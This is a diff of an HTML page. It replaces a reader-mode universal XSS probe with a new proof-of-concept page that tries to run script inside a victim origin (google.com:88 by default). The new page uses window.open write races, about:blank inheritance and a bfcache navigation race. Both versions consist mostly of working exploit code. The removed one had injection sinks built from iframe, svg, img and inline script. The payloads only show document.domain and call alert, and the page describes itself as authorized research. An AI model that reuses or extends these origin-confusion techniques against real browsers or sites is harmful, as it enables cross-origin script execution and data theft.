@@ -1,129 +1,113 @@
 <!doctype html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>The Long Guide to Threshold Cryptography — A Benign Reader Article</title>
-    <meta name="author" content="Research Desk">
-    <style>
-    :root {
-        color-scheme: light dark
-    }
-
-    body {
-        margin: 0;
-        font-family: system-ui, sans-serif
-    }
-
-    #source {
-        max-width: 760px;
-        margin: 24px auto;
-        line-height: 1.5;
-        padding: 0 16px
-    }
-
-    #cover {
-        position: fixed;
-        inset: 0;
-        z-index: 10;
-        display: grid;
-        place-items: center;
-        background: Canvas
-    }
-
-    #cue {
-        padding: 16px 26px;
-        border: 0;
-        border-radius: 14px;
-        background: #555;
-        color: #fff;
-        font: 700 18px system-ui
-    }
-
-    #cue.go {
-        background: #c00020
-    }
-
-    .keepframe {
-        width: 1px;
-        height: 1px;
-        border: 0
-    }
-
-    svg {
-        width: 1px;
-        height: 1px
-    }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>page</title>
+<style>
+ :root{--line:#dcdce2;--card:#f4f4f7}
+ *{box-sizing:border-box}
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;line-height:1.5;color:#111}
+ .wrap{max-width:540px;margin:auto;padding:16px}
+ h1{font-size:18px}h2{font-size:14px;margin:16px 0 4px}
+ p{font-size:13px;color:#666}
+ code{background:var(--card);padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}
+ input{width:100%;padding:10px;font-size:16px;border:1px solid var(--line);border-radius:9px;margin:6px 0}
+ button{font-size:14px;padding:11px 12px;margin:4px 0;width:100%;border:1px solid var(--line);border-radius:9px;background:#fff;text-align:left}
+ button:active{background:var(--card)}
+ .diag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;margin:8px 0;font-size:12px;white-space:pre-wrap}
+ .warn{color:#b23;font-size:11px}
+</style>
 </head>
 <body>
-    <!--
-      TARGET (victim origin) is HARDCODED as a literal in each sink's guard + the nav-race below,
-      because reader mode strips the main <script>, so each sink must be self-contained and carry
-      its own origin check. To change the target, find/replace:  https://example.com:88
-      Use a HANGING port (e.g. :88) so the navigation stays pending and the article is extracted.
-      BENIGN: each sink only fires its proof WHEN the reader view's origin == TARGET, and proves
-      cross-origin execution via document.domain ONLY — no cookies / no user data are read.
-    -->
-    <article id="source">
-        <h1>The Long Guide to Threshold Cryptography</h1>
-        <p>
-            <em>Benign reader-UXSS probe. Fires only in the TARGET origin; proves via document.domain.</em>
-        </p>
+<div class="wrap">
+ <h1>UXSS origin-confusion probe (benign)</h1>
+ <p>Authorized research. Reuses the nav-race / origin-confusion primitive. Each technique tries to
+    run JS in the VICTIM origin; a sink fires its proof ONLY when <code>location.origin</code> equals
+    the victim (guarded), proving cross-origin execution via <code>document.domain</code> — no cookies
+    or data are read.</p>
 
-        <!-- SINK 1: javascript: iframe kept by Mercury/Postlight (mercury-parser-keep); acts on parent (reader doc) -->
-        <iframe class="mercury-parser-keep keepframe" src="javascript:(function(){try{if(parent.location.origin==='https://example.com:88'){var d=parent.document;d.open();d.write('<!doctype html><meta name=viewport content=width=device-width,initial-scale=1><title>uxss</title><body style=font-family:system-ui;padding:20px><h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=js-iframe</p><p>document.domain=<b>'+d.domain+'</b></p><p>window===top:'+(parent===parent.top)+'</p><p style=color:#555>no cookies/data read</p>');d.close();parent.alert('BENIGN UXSS PROOF sink=js-iframe domain='+d.domain)}}catch(e){}})()"></iframe>
+ <p>Victim origin (use a HANGING port so navigation stays pending):</p>
+ <input id="victim" value="https://www.google.com:88" />
+ <div class="diag">this page origin = <span id="o"></span></div>
 
-        <!-- SINK 2: svg onload kept; acts on its own (reader) document -->
-        <svg class="mercury-parser-keep" xmlns="http://www.w3.org/2000/svg" onload="try{if(location.origin==='https://example.com:88'){document.open();document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=svg-onload</p><p>document.domain=<b>'+document.domain+'</b></p>');document.close();alert('BENIGN UXSS PROOF sink=svg domain='+document.domain)}}catch(e){}"></svg>
+ <h2>A · opened-tab direct write</h2>
+ <p>open(victim-hanging) → try document.write into it during pending. Throws (SOP holds)=safe; runs as victim=UXSS.</p>
+ <button onclick="techA()">A — window.open(victim) + write race</button>
 
-        <!-- SINK 3: img onerror kept -->
-        <img class="mercury-parser-keep" src="x" alt="" onerror="try{if(location.origin==='https://example.com:88'){document.open();document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=img-onerror</p><p>document.domain=<b>'+document.domain+'</b></p>');document.close();alert('BENIGN UXSS PROOF sink=img domain='+document.domain)}}catch(e){}">
+ <h2>A2 · about:blank inherit → navigate</h2>
+ <p>open(about:blank) → write benign → navigate that tab to victim-hanging → re-write; if the write now runs as victim=UXSS.</p>
+ <button onclick="techA2()">A2 — about:blank inherit race</button>
 
-        <!-- SINK 4: inline script kept -->
-        <script class="mercury-parser-keep">
-        try {
-            if (location.origin === 'https://example.com:88') {
-                document.open();
-                document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=inline-script</p><p>document.domain=<b>' + document.domain + '</b></p>');
-                document.close();
-                alert('BENIGN UXSS PROOF sink=script domain=' + document.domain)
-            }
-        } catch (e) {}
-        </script>
+ <h2>E · bfcache + nav-race (in THIS tab)</h2>
+ <p class="warn">navigates THIS tab; uses history so you can come back.</p>
+ <button onclick="techE()">E — pushState → navigate victim-hanging → back</button>
 
-        <p id="padding"></p>
-    </article>
+ <div class="diag" id="log">log:</div>
+ <p class="diag"><b>Verdict:</b> a popup/banner "BENIGN UXSS PROOF … domain=&lt;victim&gt;" = UXSS.
+    A thrown SecurityError (logged) = same-origin policy holding = safe.</p>
+ <p class="warn">Test only on your own device / authorized target.</p>
+</div>
 
-    <div id="cover">
-        <button id="cue" type="button" disabled>WAIT</button>
-    </div>
+<script>
+ var L = document.getElementById('log');
+ function log(m){ L.textContent += '\n' + m; }
+ document.getElementById('o').textContent = location.origin;
+ function victim(){ return (document.getElementById('victim').value || 'https://www.google.com:88').trim(); }
 
-    <script>
-    (() => {
-        const params = new URLSearchParams(location.search);
-        const num = (n, def, min, max) => {
-            const v = Number(params.get(n));
-            return Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : def;
-        };
-        const delay = num('delay', 15000, 5000, 60000);
-        const lead = num('lead', 500, 100, 1200);
-        const cue = document.querySelector('#cue');
+ // benign self-contained sink string, guarded to the victim origin
+ function sink(tag, V){
+   return "if(location.origin==='"+V+"'){document.open();document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink="+tag+"</p><p>document.domain=<b>'+document.domain+'</b></p><p style=col
+or:#555>no cookies read</p>');document.close();try{alert('BENIGN UXSS PROOF "+tag+" domain='+document.domain)}catch(e){}}";
+ }
 
-        document.querySelector('#padding').textContent =
-        'Reader extraction padding keeps article conversion busy. '.repeat(19000);
+ // A — open victim (hanging), try to write during pending
+ function techA(){
+   var V = victim();
+   var w = window.open(V, '_blank');
+   if(!w){ log('A: popup blocked'); return; }
+   log('A: opened '+V+' — trying writes…');
+   var tries=[60,250,700,1500], i=0;
+   (function next(){
+     if(i>=tries.length) return;
+     setTimeout(function(){
+       try{ w.document.write('<script>'+sink('A-write',V)+'<\/script>'); w.document.close(); log('A: write['+i+'] OK (check tab for proof)'); }
+       catch(e){ log('A: write['+i+'] blocked (SOP holds): '+e.name); }
+       i++; next();
+     }, tries[i]);
+   })();
+ }
 
-        setTimeout(() => {
-            cue.textContent = 'TAP READER MODE NOW';
-            cue.classList.add('go');
-        }, delay - lead);
-        // nav-race to the HANGING target so the pending origin becomes TARGET; then tap Reader Mode.
-        setTimeout(() => {
-            try {
-                location.assign('https://example.com:88');
-            } catch (e) {}
-        }, delay);
-    })();
-    </script>
+ // A2 — about:blank inherit, write, then navigate to victim-hanging, re-write
+ function techA2(){
+   var V = victim();
+   var w = window.open('about:blank','_blank');
+   if(!w){ log('A2: popup blocked'); return; }
+   try{ w.document.write('<h1>BENIGN — about:blank phase</h1>'); w.document.close(); }catch(e){}
+   log('A2: wrote about:blank; navigating to '+V);
+   setTimeout(function(){ try{ w.location.href = V; }catch(e){ log('A2: nav blocked '+e.name); } }, 1);
+   var tries=[80,300,800,1600], i=0;
+   (function next(){
+     if(i>=tries.length) return;
+     setTimeout(function(){
+       try{ w.document.write('<script>'+sink('A2-rewrite',V)+'<\/script>'); w.document.close(); log('A2: rewrite['+i+'] OK'); }
+       catch(e){ log('A2: rewrite['+i+'] blocked: '+e.name); }
+       i++; next();
+     }, tries[i]);
+   })();
+ }
+
+ // E — bfcache: pushState marker, navigate away to victim-hanging, user taps Back
+ function techE(){
+   var V = victim();
+   history.pushState({uxss:1}, '', location.pathname + '#before');
+   log('E: pushState done. Navigating this tab to '+V+' — when it hangs, tap browser BACK; a restored page may run the guarded sink if origin got confused.');
+   // inject a guarded sink into THIS document that only fires if origin becomes victim on restore
+   var s=document.createElement('script'); s.textContent = sink('E-bfcache', V); document.body.appendChild(s);
+   setTimeout(function(){ try{ location.assign(V); }catch(e){ log('E: nav blocked '+e.name); } }, 400);
+ }
+ window.addEventListener('pageshow', function(ev){ if(ev.persisted){ log('E: pageshow persisted=true (bfcache restore) origin='+location.origin); var s=document.createElement('script'); s.textCont
+ent=sink('E-restore', victim()); document.body.appendChild(s); } });
+</script>
 </body>
 </html>
